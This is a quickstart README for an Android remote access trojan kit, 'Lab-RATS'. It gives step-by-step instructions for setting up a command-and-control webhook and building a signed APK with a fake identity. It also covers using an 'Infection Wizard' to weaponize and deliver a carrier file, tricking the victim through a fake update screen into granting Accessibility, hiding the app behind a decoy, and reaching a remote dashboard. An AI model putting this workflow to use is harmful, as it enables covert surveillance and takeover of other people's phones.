# 00 — Quickstart

**Prerequisites:** JDK 17 or 21 on PATH, Android SDK with build-tools 34+, `JAVA_HOME` set.
See [01-requirements.md](01-requirements.md).

## 1. Clone

    git clone https://github.com/kool277/Lab-RATS-v1.6.git
    cd Lab-RATS-v1.6/apk-builder

## 2. Pick a C2 transport first

Decide before you build — the webhook URL is baked into the APK at compile time.

- **Relay (works on any network):** deploy `c2-server/` to Render, copy the URL.
  See [03-c2-deployment.md](03-c2-deployment.md).
- **Google Sheet only:** deploy the Apps Script webhook, copy the `/macros/s/...` URL.
- **Neither:** the build still completes; you just get no check-ins and must find the
  device's IPv6 address by hand.

## 3. Build

    # Linux / macOS
    chmod +x build.sh && ./build.sh

    # Windows PowerShell
    powershell -ExecutionPolicy Bypass -File .\build.ps1

    # Windows CMD
    build.bat

Choose **1 (Start Build)** for a single device, or **6 (Infection Wizard)** to chain
build → host → shorten → weaponize in one pass.

You will be prompted for: masquerade identity, app name, package ID, minimum SDK,
and the C2 webhook URL.

## 4. Collect artifacts

    ls output/
    # {AppName}-v{Version}-signed.apk
    # exploit.*   (only if you ran the wizard)

## 5. Install

    adb install output/{AppName}-v{Version}-signed.apk

Or deliver the carrier file from step 3. **The app must be opened once** — nothing
starts from the installer alone. Toggle Accessibility on when the fake update screen
asks; every other permission is auto-granted behind that screen.

## 6. Reach the dashboard

Within ~5 seconds of launch the device checks in. Either:

- Open the check-in row's C2 link (relay or Google Sheet), or
- `http://[<device-gua>]:9191` directly.

Login: `admin1337` — **change it on the Terminal tab immediately.**

## 7. If the icon vanished

Expected — the app swaps to the decoy a few seconds after launch.

- Dial `*#1337#`, or
- Tap the middle of the decoy screen 10 times quickly.

Both unmask the dashboard and drop back to stealth on close.
